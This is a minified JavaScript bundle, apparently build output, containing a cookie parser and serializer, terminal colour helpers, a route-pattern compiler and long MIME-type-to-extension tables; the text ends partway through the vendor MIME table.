var is=Object.create;var gt=Object.defineProperty;var rs=Object.getOwnPropertyDescriptor;var ls=Object.getOwnPropertyNames;var cs=Object.getPrototypeOf,us=Object.prototype.hasOwnProperty;var F=(e,n)=>()=>(e&&(n=e(e=0)),n);var de=(e,n)=>()=>(n||e((n={exports:{}}).exports,n),n.exports),$=(e,n)=>{for(var a in n)gt(e,a,{get:n[a],enumerable:!0})},ps=(e,n,a,t)=>{if(n&&typeof n=="object"||typeof n=="function")for(let o of ls(n))!us.call(e,o)&&o!==a&&gt(e,o,{get:()=>n[o],enumerable:!(t=rs(n,o))||t.enumerable});return e};var S=(e,n,a)=>(a=e!=null?is(cs(e)):{},ps(n||!e||!e.__esModule?gt(a,"default",{value:e,enumerable:!0}):a,e));var Dt=(e,n,a)=>{if(!n.has(e))throw TypeError("Cannot "+a)};var d=(e,n,a)=>(Dt(e,n,"read from private field"),a?a.call(e):n.get(e)),k=(e,n,a)=>{if(n.has(e))throw TypeError("Cannot add the same private member more than once");n instanceof WeakSet?n.add(e):n.set(e,a)},j=(e,n,a,t)=>(Dt(e,n,"write to private field"),t?t.call(e,a):n.set(e,a),a);var L=(e,n,a)=>(Dt(e,n,"access private method"),a);var N=de(yt=>{"use strict";yt.parse=ms;yt.serialize=hs;var ds=Object.prototype.toString,Qe=/^[\u0009\u0020-\u007e\u0080-\u00ff]+$/;function ms(e,n){if(typeof e!="string")throw new TypeError("argument str must be a string");for(var a={},t=n||{},o=t.decode||fs,s=0;s<e.length;){var i=e.indexOf("=",s);if(i===-1)break;var l=e.indexOf(";",s);if(l===-1)l=e.length;else if(l<i){s=e.lastIndexOf(";",i-1)+1;continue}var c=e.slice(s,i).trim();if(a[c]===void 0){var u=e.slice(i+1,l).trim();u.charCodeAt(0)===34&&(u=u.slice(1,-1)),a[c]=ys(u,o)}s=l+1}return a}function hs(e,n,a){var t=a||{},o=t.encode||gs;if(typeof o!="function")throw new TypeError("option encode is invalid");if(!Qe.test(e))throw new TypeError("argument name is invalid");var s=o(n);if(s&&!Qe.test(s))throw new TypeError("argument val is invalid");var i=e+"="+s;if(t.maxAge!=null){var l=t.maxAge-0;if(isNaN(l)||!isFinite(l))throw new TypeError("option maxAge is invalid");i+="; Max-Age="+Math.floor(l)}if(t.domain){if(!Qe.test(t.domain))throw new TypeError("option domain is invalid");i+="; Domain="+t.domain}if(t.path){if(!Qe.test(t.path))throw new TypeError("option path is invalid");i+="; Path="+t.path}if(t.expires){var c=t.expires;if(!Ds(c)||isNaN(c.valueOf()))throw new TypeError("option expires is invalid");i+="; Expires="+c.toUTCString()}if(t.httpOnly&&(i+="; HttpOnly"),t.secure&&(i+="; Secure"),t.priority){var u=typeof t.priority=="string"?t.priority.toLowerCase():t.priority;switch(u){case"low":i+="; Priority=Low";break;case"medium":i+="; Priority=Medium";break;case"high":i+="; Priority=High";break;default:throw new TypeError("option priority is invalid")}}if(t.sameSite){var r=typeof t.sameSite=="string"?t.sameSite.toLowerCase():t.sameSite;switch(r){case!0:i+="; SameSite=Strict";break;case"lax":i+="; SameSite=Lax";break;case"strict":i+="; SameSite=Strict";break;case"none":i+="; SameSite=None";break;default:throw new TypeError("option sameSite is invalid")}}return i}function fs(e){return e.indexOf("%")!==-1?decodeURIComponent(e):e}function gs(e){return encodeURIComponent(e)}function Ds(e){return ds.call(e)==="[object Date]"||e instanceof Date}function ys(e,n){try{return n(e)}catch{return e}}});function C(e,n){let a=new RegExp(`\\x1b\\[${n}m`,"g"),t=`\x1B[${e}m`,o=`\x1B[${n}m`;return function(s){return!vs.enabled||s==null?s:t+(~(""+s).indexOf(o)?s.replace(a,o+t):s)+o}}var vt,dn,mn,hn,fn,vs,gn,Te,Dn,gc,Dc,yc,vc,Ac,bc,yn,wc,At,xc,Sc,vn,Cc,Ec,Fc,kc,Bc,Wc,Pc,Tc,zc,Ic,Mc,U=F(()=>{fn=!0;typeof process<"u"&&({FORCE_COLOR:vt,NODE_DISABLE_COLORS:dn,NO_COLOR:mn,TERM:hn}=process.env||{},fn=process.stdout&&process.stdout.isTTY);vs={enabled:!dn&&mn==null&&hn!=="dumb"&&(vt!=null&&vt!=="0"||fn)};gn=C(0,0),Te=C(1,22),Dn=C(2,22),gc=C(3,23),Dc=C(4,24),yc=C(7,27),vc=C(8,28),Ac=C(9,29),bc=C(30,39),yn=C(31,39),wc=C(32,39),At=C(33,39),xc=C(34,39),Sc=C(35,39),vn=C(36,39),Cc=C(37,39),Ec=C(90,39),Fc=C(90,39),kc=C(40,49),Bc=C(41,49),Wc=C(42,49),Pc=C(43,49),Tc=C(44,49),zc=C(45,49),Ic=C(46,49),Mc=C(47,49)});function As(e){for(var n=[],a=0;a<e.length;){var t=e[a];if(t==="*"||t==="+"||t==="?"){n.push({type:"MODIFIER",index:a,value:e[a++]});continue}if(t==="\\"){n.push({type:"ESCAPED_CHAR",index:a++,value:e[a++]});continue}if(t==="{"){n.push({type:"OPEN",index:a,value:e[a++]});continue}if(t==="}"){n.push({type:"CLOSE",index:a,value:e[a++]});continue}if(t===":"){for(var o="",s=a+1;s<e.length;){var i=e.charCodeAt(s);if(i>=48&&i<=57||i>=65&&i<=90||i>=97&&i<=122||i===95){o+=e[s++];continue}break}if(!o)throw new TypeError("Missing parameter name at ".concat(a));n.push({type:"NAME",index:a,value:o}),a=s;continue}if(t==="("){var l=1,c="",s=a+1;if(e[s]==="?")throw new TypeError('Pattern cannot start with "?" at '.concat(s));for(;s<e.length;){if(e[s]==="\\"){c+=e[s++]+e[s++];continue}if(e[s]===")"){if(l--,l===0){s++;break}}else if(e[s]==="("&&(l++,e[s+1]!=="?"))throw new TypeError("Capturing groups are not allowed at ".concat(s));c+=e[s++]}if(l)throw new TypeError("Unbalanced pattern at ".concat(a));if(!c)throw new TypeError("Missing pattern at ".concat(a));n.push({type:"PATTERN",index:a,value:c}),a=s;continue}n.push({type:"CHAR",index:a,value:e[a++]})}return n.push({type:"END",index:a,value:""}),n}function bs(e,n){n===void 0&&(n={});for(var a=As(e),t=n.prefixes,o=t===void 0?"./":t,s="[^".concat(xs(n.delimiter||"/#?"),"]+?"),i=[],l=0,c=0,u="",r=function(J){if(c<a.length&&a[c].type===J)return a[c++].value},p=function(J){var te=r(J);if(te!==void 0)return te;var Ye=a[c],g=Ye.type,w=Ye.index;throw new TypeError("Unexpected ".concat(g," at ").concat(w,", expected ").concat(J))},m=function(){for(var J="",te;te=r("CHAR")||r("ESCAPED_CHAR");)J+=te;return J};c<a.length;){var E=r("CHAR"),y=r("NAME"),x=r("PATTERN");if(y||x){var b=E||"";o.indexOf(b)===-1&&(u+=b,b=""),u&&(i.push(u),u=""),i.push({name:y||l++,prefix:b,suffix:"",pattern:x||s,modifier:r("MODIFIER")||""});continue}var I=E||r("ESCAPED_CHAR");if(I){u+=I;continue}u&&(i.push(u),u="");var M=r("OPEN");if(M){var b=m(),_=r("NAME")||"",v=r("PATTERN")||"",Q=m();p("CLOSE"),i.push({name:_||(v?l++:""),pattern:_&&!v?s:v,prefix:b,suffix:Q,modifier:r("MODIFIER")||""});continue}p("END")}return i}function An(e,n){return ws(bs(e,n),n)}function ws(e,n){n===void 0&&(n={});var a=Ss(n),t=n.encode,o=t===void 0?function(c){return c}:t,s=n.validate,i=s===void 0?!0:s,l=e.map(function(c){if(typeof c=="object")return new RegExp("^(?:".concat(c.pattern,")$"),a)});return function(c){for(var u="",r=0;r<e.length;r++){var p=e[r];if(typeof p=="string"){u+=p;continue}var m=c?c[p.name]:void 0,E=p.modifier==="?"||p.modifier==="*",y=p.modifier==="*"||p.modifier==="+";if(Array.isArray(m)){if(!y)throw new TypeError('Expected "'.concat(p.name,'" to not repeat, but got an array'));if(m.length===0){if(E)continue;throw new TypeError('Expected "'.concat(p.name,'" to not be empty'))}for(var x=0;x<m.length;x++){var b=o(m[x],p);if(i&&!l[r].test(b))throw new TypeError('Expected all "'.concat(p.name,'" to match "').concat(p.pattern,'", but got "').concat(b,'"'));u+=p.prefix+b+p.suffix}continue}if(typeof m=="string"||typeof m=="number"){var b=o(String(m),p);if(i&&!l[r].test(b))throw new TypeError('Expected "'.concat(p.name,'" to match "').concat(p.pattern,'", but got "').concat(b,'"'));u+=p.prefix+b+p.suffix;continue}if(!E){var I=y?"an array":"a string";throw new TypeError('Expected "'.concat(p.name,'" to be ').concat(I))}}return u}}function xs(e){return e.replace(/([.+*?=^!:${}()[\]|/\\])/g,"\\$1")}function Ss(e){return e&&e.sensitive?"":"i"}var bn=F(()=>{});var xn=de((Lc,wn)=>{"use strict";function Xe(){this._types=Object.create(null),this._extensions=Object.create(null);for(let e=0;e<arguments.length;e++)this.define(arguments[e]);this.define=this.define.bind(this),this.getType=this.getType.bind(this),this.getExtension=this.getExtension.bind(this)}Xe.prototype.define=function(e,n){for(let a in e){let t=e[a].map(function(o){return o.toLowerCase()});a=a.toLowerCase();for(let o=0;o<t.length;o++){let s=t[o];if(s[0]!=="*"){if(!n&&s in this._types)throw new Error('Attempt to change mapping for "'+s+'" extension from "'+this._types[s]+'" to "'+a+'". Pass `force=true` to allow this, otherwise remove "'+s+'" from the list of extensions for "'+a+'".');this._types[s]=a}}if(n||!this._extensions[a]){let o=t[0];this._extensions[a]=o[0]!=="*"?o:o.substr(1)}}};Xe.prototype.getType=function(e){e=String(e);let n=e.replace(/^.*[/\\]/,"").toLowerCase(),a=n.replace(/^.*\./,"").toLowerCase(),t=n.length<e.length;return(a.length<n.length-1||!t)&&this._types[a]||null};Xe.prototype.getExtension=function(e){return e=/^\s*([^;\s]*)/.test(e)&&RegExp.$1,e&&this._extensions[e.toLowerCase()]||null};wn.exports=Xe});var Cn=de(($c,Sn)=>{Sn.exports={"application/andrew-inset":["ez"],"application/applixware":["aw"],"application/atom+xml":["atom"],"application/atomcat+xml":["atomcat"],"application/atomdeleted+xml":["atomdeleted"],"application/atomsvc+xml":["atomsvc"],"application/atsc-dwd+xml":["dwd"],"application/atsc-held+xml":["held"],"application/atsc-rsat+xml":["rsat"],"application/bdoc":["bdoc"],"application/calendar+xml":["xcs"],"application/ccxml+xml":["ccxml"],"application/cdfx+xml":["cdfx"],"application/cdmi-capability":["cdmia"],"application/cdmi-container":["cdmic"],"application/cdmi-domain":["cdmid"],"application/cdmi-object":["cdmio"],"application/cdmi-queue":["cdmiq"],"application/cu-seeme":["cu"],"application/dash+xml":["mpd"],"application/davmount+xml":["davmount"],"application/docbook+xml":["dbk"],"application/dssc+der":["dssc"],"application/dssc+xml":["xdssc"],"application/ecmascript":["es","ecma"],"application/emma+xml":["emma"],"application/emotionml+xml":["emotionml"],"application/epub+zip":["epub"],"application/exi":["exi"],"application/express":["exp"],"application/fdt+xml":["fdt"],"application/font-tdpfr":["pfr"],"application/geo+json":["geojson"],"application/gml+xml":["gml"],"application/gpx+xml":["gpx"],"application/gxf":["gxf"],"application/gzip":["gz"],"application/hjson":["hjson"],"application/hyperstudio":["stk"],"application/inkml+xml":["ink","inkml"],"application/ipfix":["ipfix"],"application/its+xml":["its"],"application/java-archive":["jar","war","ear"],"application/java-serialized-object":["ser"],"application/java-vm":["class"],"application/javascript":["js","mjs"],"application/json":["json","map"],"application/json5":["json5"],"application/jsonml+json":["jsonml"],"application/ld+json":["jsonld"],"application/lgr+xml":["lgr"],"application/lost+xml":["lostxml"],"application/mac-binhex40":["hqx"],"application/mac-compactpro":["cpt"],"application/mads+xml":["mads"],"application/manifest+json":["webmanifest"],"application/marc":["mrc"],"application/marcxml+xml":["mrcx"],"application/mathematica":["ma","nb","mb"],"application/mathml+xml":["mathml"],"application/mbox":["mbox"],"application/mediaservercontrol+xml":["mscml"],"application/metalink+xml":["metalink"],"application/metalink4+xml":["meta4"],"application/mets+xml":["mets"],"application/mmt-aei+xml":["maei"],"application/mmt-usd+xml":["musd"],"application/mods+xml":["mods"],"application/mp21":["m21","mp21"],"application/mp4":["mp4s","m4p"],"application/msword":["doc","dot"],"application/mxf":["mxf"],"application/n-quads":["nq"],"application/n-triples":["nt"],"application/node":["cjs"],"application/octet-stream":["bin","dms","lrf","mar","so","dist","distz","pkg","bpk","dump","elc","deploy","exe","dll","deb","dmg","iso","img","msi","msp","msm","buffer"],"application/oda":["oda"],"application/oebps-package+xml":["opf"],"application/ogg":["ogx"],"application/omdoc+xml":["omdoc"],"application/onenote":["onetoc","onetoc2","onetmp","onepkg"],"application/oxps":["oxps"],"application/p2p-overlay+xml":["relo"],"application/patch-ops-error+xml":["xer"],"application/pdf":["pdf"],"application/pgp-encrypted":["pgp"],"application/pgp-signature":["asc","sig"],"application/pics-rules":["prf"],"application/pkcs10":["p10"],"application/pkcs7-mime":["p7m","p7c"],"application/pkcs7-signature":["p7s"],"application/pkcs8":["p8"],"application/pkix-attr-cert":["ac"],"application/pkix-cert":["cer"],"application/pkix-crl":["crl"],"application/pkix-pkipath":["pkipath"],"application/pkixcmp":["pki"],"application/pls+xml":["pls"],"application/postscript":["ai","eps","ps"],"application/provenance+xml":["provx"],"application/pskc+xml":["pskcxml"],"application/raml+yaml":["raml"],"application/rdf+xml":["rdf","owl"],"application/reginfo+xml":["rif"],"application/relax-ng-compact-syntax":["rnc"],"application/resource-lists+xml":["rl"],"application/resource-lists-diff+xml":["rld"],"application/rls-services+xml":["rs"],"application/route-apd+xml":["rapd"],"application/route-s-tsid+xml":["sls"],"application/route-usd+xml":["rusd"],"application/rpki-ghostbusters":["gbr"],"application/rpki-manifest":["mft"],"application/rpki-roa":["roa"],"application/rsd+xml":["rsd"],"application/rss+xml":["rss"],"application/rtf":["rtf"],"application/sbml+xml":["sbml"],"application/scvp-cv-request":["scq"],"application/scvp-cv-response":["scs"],"application/scvp-vp-request":["spq"],"application/scvp-vp-response":["spp"],"application/sdp":["sdp"],"application/senml+xml":["senmlx"],"application/sensml+xml":["sensmlx"],"application/set-payment-initiation":["setpay"],"application/set-registration-initiation":["setreg"],"application/shf+xml":["shf"],"application/sieve":["siv","sieve"],"application/smil+xml":["smi","smil"],"application/sparql-query":["rq"],"application/sparql-results+xml":["srx"],"application/srgs":["gram"],"application/srgs+xml":["grxml"],"application/sru+xml":["sru"],"application/ssdl+xml":["ssdl"],"application/ssml+xml":["ssml"],"application/swid+xml":["swidtag"],"application/tei+xml":["tei","teicorpus"],"application/thraud+xml":["tfi"],"application/timestamped-data":["tsd"],"application/toml":["toml"],"application/trig":["trig"],"application/ttml+xml":["ttml"],"application/ubjson":["ubj"],"application/urc-ressheet+xml":["rsheet"],"application/urc-targetdesc+xml":["td"],"application/voicexml+xml":["vxml"],"application/wasm":["wasm"],"application/widget":["wgt"],"application/winhlp":["hlp"],"application/wsdl+xml":["wsdl"],"application/wspolicy+xml":["wspolicy"],"application/xaml+xml":["xaml"],"application/xcap-att+xml":["xav"],"application/xcap-caps+xml":["xca"],"application/xcap-diff+xml":["xdf"],"application/xcap-el+xml":["xel"],"application/xcap-ns+xml":["xns"],"application/xenc+xml":["xenc"],"application/xhtml+xml":["xhtml","xht"],"application/xliff+xml":["xlf"],"application/xml":["xml","xsl","xsd","rng"],"application/xml-dtd":["dtd"],"application/xop+xml":["xop"],"application/xproc+xml":["xpl"],"application/xslt+xml":["*xsl","xslt"],"application/xspf+xml":["xspf"],"application/xv+xml":["mxml","xhvml","xvml","xvm"],"application/yang":["yang"],"application/yin+xml":["yin"],"application/zip":["zip"],"audio/3gpp":["*3gpp"],"audio/adpcm":["adp"],"audio/amr":["amr"],"audio/basic":["au","snd"],"audio/midi":["mid","midi","kar","rmi"],"audio/mobile-xmf":["mxmf"],"audio/mp3":["*mp3"],"audio/mp4":["m4a","mp4a"],"audio/mpeg":["mpga","mp2","mp2a","mp3","m2a","m3a"],"audio/ogg":["oga","ogg","spx","opus"],"audio/s3m":["s3m"],"audio/silk":["sil"],"audio/wav":["wav"],"audio/wave":["*wav"],"audio/webm":["weba"],"audio/xm":["xm"],"font/collection":["ttc"],"font/otf":["otf"],"font/ttf":["ttf"],"font/woff":["woff"],"font/woff2":["woff2"],"image/aces":["exr"],"image/apng":["apng"],"image/avif":["avif"],"image/bmp":["bmp"],"image/cgm":["cgm"],"image/dicom-rle":["drle"],"image/emf":["emf"],"image/fits":["fits"],"image/g3fax":["g3"],"image/gif":["gif"],"image/heic":["heic"],"image/heic-sequence":["heics"],"image/heif":["heif"],"image/heif-sequence":["heifs"],"image/hej2k":["hej2"],"image/hsj2":["hsj2"],"image/ief":["ief"],"image/jls":["jls"],"image/jp2":["jp2","jpg2"],"image/jpeg":["jpeg","jpg","jpe"],"image/jph":["jph"],"image/jphc":["jhc"],"image/jpm":["jpm"],"image/jpx":["jpx","jpf"],"image/jxr":["jxr"],"image/jxra":["jxra"],"image/jxrs":["jxrs"],"image/jxs":["jxs"],"image/jxsc":["jxsc"],"image/jxsi":["jxsi"],"image/jxss":["jxss"],"image/ktx":["ktx"],"image/ktx2":["ktx2"],"image/png":["png"],"image/sgi":["sgi"],"image/svg+xml":["svg","svgz"],"image/t38":["t38"],"image/tiff":["tif","tiff"],"image/tiff-fx":["tfx"],"image/webp":["webp"],"image/wmf":["wmf"],"message/disposition-notification":["disposition-notification"],"message/global":["u8msg"],"message/global-delivery-status":["u8dsn"],"message/global-disposition-notification":["u8mdn"],"message/global-headers":["u8hdr"],"message/rfc822":["eml","mime"],"model/3mf":["3mf"],"model/gltf+json":["gltf"],"model/gltf-binary":["glb"],"model/iges":["igs","iges"],"model/mesh":["msh","mesh","silo"],"model/mtl":["mtl"],"model/obj":["obj"],"model/step+xml":["stpx"],"model/step+zip":["stpz"],"model/step-xml+zip":["stpxz"],"model/stl":["stl"],"model/vrml":["wrl","vrml"],"model/x3d+binary":["*x3db","x3dbz"],"model/x3d+fastinfoset":["x3db"],"model/x3d+vrml":["*x3dv","x3dvz"],"model/x3d+xml":["x3d","x3dz"],"model/x3d-vrml":["x3dv"],"text/cache-manifest":["appcache","manifest"],"text/calendar":["ics","ifb"],"text/coffeescript":["coffee","litcoffee"],"text/css":["css"],"text/csv":["csv"],"text/html":["html","htm","shtml"],"text/jade":["jade"],"text/jsx":["jsx"],"text/less":["less"],"text/markdown":["markdown","md"],"text/mathml":["mml"],"text/mdx":["mdx"],"text/n3":["n3"],"text/plain":["txt","text","conf","def","list","log","in","ini"],"text/richtext":["rtx"],"text/rtf":["*rtf"],"text/sgml":["sgml","sgm"],"text/shex":["shex"],"text/slim":["slim","slm"],"text/spdx":["spdx"],"text/stylus":["stylus","styl"],"text/tab-separated-values":["tsv"],"text/troff":["t","tr","roff","man","me","ms"],"text/turtle":["ttl"],"text/uri-list":["uri","uris","urls"],"text/vcard":["vcard"],"text/vtt":["vtt"],"text/xml":["*xml"],"text/yaml":["yaml","yml"],"video/3gpp":["3gp","3gpp"],"video/3gpp2":["3g2"],"video/h261":["h261"],"video/h263":["h263"],"video/h264":["h264"],"video/iso.segment":["m4s"],"video/jpeg":["jpgv"],"video/jpm":["*jpm","jpgm"],"video/mj2":["mj2","mjp2"],"video/mp2t":["ts"],"video/mp4":["mp4","mp4v","mpg4"],"video/mpeg":["mpeg","mpg","mpe","m1v","m2v"],"video/ogg":["ogv"],"video/quicktime":["qt","mov"],"video/webm":["webm"]}});var Fn=de((Hc,En)=>{En.exports={"application/prs.cww":["cww"],"application/vnd.1000minds.decision-model+xml":["1km"],"application/vnd.3gpp.pic-bw-large":["plb"],"application/vnd.3gpp.pic-bw-small":["psb"],"application/vnd.3gpp.pic-bw-var":["pvb"],"application/vnd.3gpp2.tcap":["tcap"],"application/vnd.3m.post-it-notes":["pwn"],"application/vnd.accpac.simply.aso":["aso"],"application/vnd.accpac.simply.imp":["imp"],"application/vnd.acucobol":["acu"],"application/vnd.acucorp":["atc","acutc"],"application/vnd.adobe.air-application-installer-package+zip":["air"],"application/vnd.adobe.formscentral.fcdt":["fcdt"],"application/vnd.adobe.fxp":["fxp","fxpl"],"application/vnd.adobe.xdp+xml":["xdp"],"application/vnd.adobe.xfdf":["xfdf"],"application/vnd.ahead.space":["ahead"],"application/vnd.airzip.filesecure.azf":["azf"],"application/vnd.airzip.filesecure.azs":["azs"],"application/vnd.amazon.ebook":["azw"],"application/vnd.americandynamics.acc":["acc"],"application/vnd.amiga.ami":["ami"],"application/vnd.android.package-archive":["apk"],"application/vnd.anser-web-certificate-issue-initiation":["cii"],"application/vnd.anser-web-funds-transfer-initiation":["fti"],"application/vnd.antix.game-component":["atx"],"application/vnd.apple.installer+xml":["mpkg"],"application/vnd.apple.keynote":["key"],"application/vnd.apple.mpegurl":["m3u8"],"application/vnd.apple.numbers":["numbers"],"application/vnd.apple.pages":["pages"],"application/vnd.apple.pkpass":["pkpass"],"application/vnd.aristanetworks.swi":["swi"],"application/vnd.astraea-software.iota":["iota"],"application/vnd.audiograph":["aep"],"application/vnd.balsamiq.bmml+xml":["bmml"],"application/vnd.blueice.multipass":["mpm"],"application/vnd.bmi":["bmi"],"application/vnd.businessobjects":["rep"],"application/vnd.chemdraw+xml":["cdxml"],"application/vnd.chipnuts.karaoke-mmd":["mmd"],"application/vnd.cinderella":["cdy"],"application/vnd.citationstyles.style+xml":["csl"],"application/vnd.claymore":["cla"],"application/vnd.cloanto.rp9":["rp9"],"application/vnd.clonk.c4group":["c4g","c4d","c4f","c4p","c4u"],"application/vnd.cluetrust.cartomobile-config":["c11amc"],"application/vnd.cluetrust.cartomobile-config-pkg":["c11amz"],"application/vnd.commonspace":["csp"],"application/vnd.contact.cmsg":["cdbcmsg"],"application/vnd.cosmocaller":["cmc"],"application/vnd.crick.clicker":["clkx"],"application/vnd.crick.clicker.keyboard":["clkk"],"application/vnd.crick.clicker.palette":["clkp"],"application/vnd.crick.clicker.template":["clkt"],"application/vnd.crick.clicker.wordbank":["clkw"],"application/vnd.criticaltools.wbs+xml":["wbs"],"application/vnd.ctc-posml":["pml"],"application/vnd.cups-ppd":["ppd"],"application/vnd.curl.car":["car"],"application/vnd.curl.pcurl":["pcurl"],"application/vnd.dart":["dart"],"application/vnd.data-vision.rdz":["rdz"],"application/vnd.dbf":["dbf"],"application/vnd.dece.data":["uvf","uvvf","uvd","uvvd"],"application/vnd.dece.ttml+xml":["uvt","uvvt"],"application/vnd.dece.unspecified":["uvx","uvvx"],"application/vnd.dece.zip":["uvz","uvvz"],"application/vnd.denovo.fcselayout-link":["fe_launch"],"application/vnd.dna":["dna"],"application/vnd.dolby.mlp":["mlp"],"application/vnd.dpgraph":["dpg"],"application/vnd.dreamfactory":["dfac"],"application/vnd.ds-keypoint":["kpxx"],"application/vnd.dvb.ait":["ait"],"application/vnd.dvb.service":["svc"],"application/vnd.dynageo":["geo"],"application/vnd.ecowin.chart":["mag"],"application/vnd.enliven":["nml"],"application/vnd.epson.esf":["esf"],"application/vnd.epson.msf":["msf"],"application/vnd.epson.quickanime":["qam"],"application/vnd.epson.salt":["slt"],"application/vnd.epson.ssf":["ssf"],"application/vnd.eszigno3+xml":["es3","et3"],"application/vnd.ezpix-album":["ez2"],"application/vnd.ezpix-package":["ez3"],"application/vnd.fdf":["fdf"],"application/vnd.fdsn.mseed":["mseed"],"application/vnd.fdsn.seed":["seed","dataless"],"application/vnd.flographit":["gph"],"application/vnd.fluxtime.clip":["ftc"],"application/vnd.framemaker":["fm","frame","maker","book"],"application/vnd.frogans.fnc":["fnc"],"application/vnd.frogans.ltf":["ltf"],"application/vnd.fsc.weblaunch":["fsc"],"application/vnd.fujitsu.oasys":["oas"],"application/vnd.fujitsu.oasys2":["oa2"],"application/vnd.fujitsu.oasys3":["oa3"],"application/vnd.fujitsu.oasysgp":["fg5"],"application/vnd.fujitsu.oasysprs":["bh2"],"application/vnd.fujixerox.ddd":["ddd"],"application/vnd.fujixerox.docuworks":["xdw"],"application/vnd.fujixerox.docuworks.binder":["xbd"],"application/vnd.fuzzysheet":["fzs"],"application/vnd.genomatix.tuxedo":["txd"],"application/vnd.geogebra.file":["ggb"],"application/vnd.geogebra.tool":["ggt"],"application/vnd.geometry-explorer":["gex","gre"],"application/vnd.geonext":["gxt"],"application/vnd.geoplan":["g2w"],"application/vnd.geospace":["g3w"],"application/vnd.gmx":["gmx"],"application/vnd.google-apps.document":["gdoc"],"application/vnd.google-apps.presentation":["gslides"],"application/vnd.google-apps.spreadsheet":["gsheet"],"application/vnd.google-earth.kml+xml":["kml"],"application/vnd.google-earth.kmz":["kmz"],"application/vnd.grafeq":["gqf","gqs"],"application/vnd.groove-account":["gac"],"application/vnd.groove-help":["ghf"],"application/vnd.groove-identity-message":["gim"],"application/vnd.groove-injector":["grv"],"application/vnd.groove-tool-message":["gtm"],"application/vnd.groove-tool-template":["tpl"],"application/vnd.groove-vcard":["vcg"],"application/vnd.hal+xml":["hal"],"application/vnd.handheld-entertainment+xml":["zmm"],"application/vnd.hbci":["hbci"],"application/vnd.hhe.lesson-player":["les"],"application/vnd.hp-hpgl":["hpgl"],"application/vnd.hp-hpid":["hpid"],"application/vnd.hp-hps":["hps"],"application/vnd.hp-jlyt":["jlt"],"application/vnd.hp-pcl":["pcl"],"application/vnd.hp-pclxl":["pclxl"],"application/vnd.hydrostatix.sof-data":["sfd-hdstx"],"application/vnd.ibm.minipay":["mpy"],"application/vnd.ibm.modcap":["afp","listafp","list3820"],"application/vnd.ibm.rights-management":["irm"],"application/vnd.ibm.secure-container":["sc"],"application/vnd.iccprofile":["icc","icm"],"application/vnd.igloader":["igl"],"application/vnd.immervision-ivp":["ivp"],"application/vnd.immervision-ivu":["ivu"],"application/vnd.insors.igm":["igm"],"application/vnd.intercon.formnet":["xpw","xpx"],"application/vnd.intergeo":["i2g"],"application/vnd.intu.qbo":["qbo"],"application/vnd.intu.qfx":["qfx"],"application/vnd.ipunplugged.rcprofile":["rcprofile"],"application/vnd.irepository.package+xml":["irp"],"application/vnd.is-xpr":["xpr"],"application/vnd.isac.fcs":["fcs"],"application/vnd.jam":["jam"],"application/vnd.jcp.javame.midlet-rms":["rms"],"application/vnd.jisp":["jisp"],"application/vnd.joost.joda-archive":["joda"],"application/vnd.kahootz":["ktz","ktr"],"application/vnd.kde.karbon":["karbon"],"application/vnd.kde.kchart":["chrt"],"application/vnd.kde.kformula":["kfo"],"application/vnd.kde.kivio":["flw"],"application/vnd.kde.kontour":["kon"],"application/vnd.kde.kpresenter":["kpr","kpt"],"application/vnd.kde.kspread":["ksp"],"application/vnd.kde.kword":["kwd","kwt"],"application/vnd.kenameaapp":["htke"],"application/vnd.kidspiration":["kia"],"application/vnd.kinar":["kne","knp"],"application/vnd.koan":["skp","skd","skt","skm"],"application/vnd.kodak-descriptor":["sse"],"application/vnd.las.las+xml":["lasxml"],"application/vnd.llamagraphics.life-balance.desktop":["lbd"],"application/vnd.llamagraphics.life-balance.exchange+xml":["lbe"],"application/vnd.lotus-1-2-3":["123"],"application/vnd.lotus-approach":["apr"],"application/vnd.lotus-freelance":["pre"],"application/vnd.lotus-notes":["nsf"],"application/vnd.lotus-organizer":["org"],"application/vnd.lotus-screencam":["scm"],"application/vnd.lotus-wordpro":["lwp"],"application/vnd.macports.portpkg":["portpkg"],"application/vnd.mapbox-vector-tile":["mvt"],"application/vnd.mcd":["mcd"],"application/vnd.medcalcdata":["mc1"],"application/vnd.mediastation.cdkey":["cdkey"],"application/vnd.mfer":["mwf"],"application/vnd.mfmp":["mfm"],"application/vnd.micrografx.flo":["flo"],"application/vnd.micrografx.igx":["igx"],"application/vnd.mif":["mif"],"application/vnd.mobius.daf":["daf"],"application/vnd.mobius.dis":["dis"],"application/vnd.mobius.mbk":["mbk"],"application/vnd.mobius.mqy":["mqy"],"application/vnd.mobius.msl":["msl"],"application/vnd.mobius.plc":["plc"],"application/vnd.mobius.txf":["txf"],"application/vnd.mophun.application":["mpn"],"application/vnd.mophun.certificate":["mpc"],"application/vnd.mozilla.xul+xml":["xul"],"application/vnd.ms-artgalry":["cil"],"application/vnd.ms-cab-compressed":["cab"],"application/vnd.ms-excel":["xls","xlm","xla","xlc","xlt","xlw"],"application/vnd.ms-excel.addin.macroenabled.12":["xlam"],"application/vnd.ms-excel.sheet.binary.macroenabled.12":["xlsb"],"application/vnd.ms-excel.sheet.macroenabled.12":["xlsm"],"application/vnd.ms-excel.template.macroenabled.12":["xltm"],"application/vnd.ms-fontobject":["eot"],"application/vnd.ms-htmlhelp":["chm"],"application/vnd.ms-ims":["ims"],"application/vnd.ms-lrm":["lrm"],"application/vnd.ms-officetheme":["thmx"],"application/vnd.ms-outlook":["msg"],"application/vnd.ms-pki.seccat":["cat"],"application/vnd.ms-pki.stl":["*stl"],"application/vnd.ms-powerpoint":["ppt","pps","pot"],"application/vnd.ms-powerpoint.addin.macroenabled.12":["ppam"],"application/vnd.ms-powerpoint.presentation.macroenabled.12":["pptm"],"application/vnd.ms-powerpoint.slide.macroenabled.12":["sldm"],"application/vnd.ms-powerpoint.slideshow.macroenabled.12":["ppsm"],"application/vnd.ms-powerpoint.template.macroenabled.12":["potm"],"application/vnd.ms-project":["mpp","mpt"],"application/vnd.ms-word.document.macroenabled.12":["docm"],"application/vnd.ms-word.template.macroenabled.12":["dotm"],"application/vnd.ms-works":["wps","wks","wcm","wdb"],"application/vnd.ms-wpl":["wpl"],"application/vnd.ms-xpsdocument":["xps"],"application/vnd.mseq":["mseq"],"application/vnd.musician":["mus"],"application/vnd.muvee.style":["msty"],"application/vnd.mynfc":["taglet"],"application/vnd.neurolanguage.nlu":["nlu"],"application/vnd.nitf":["ntf","nitf"],"application/vnd.noblenet-directory":["nnd"],"application/vnd.noblenet-sealer":["nns"],"application/vnd.noblenet-web":["nnw"],"application/vnd.nokia.n-gage.ac+xml":["*ac"],"application/vnd.nokia.n-gage.data":["ngdat"],"application/vnd.nokia.n-gage.symbian.install":["n-gage"],"application/vnd.nokia.radio-preset":["rpst"],"application/vnd.n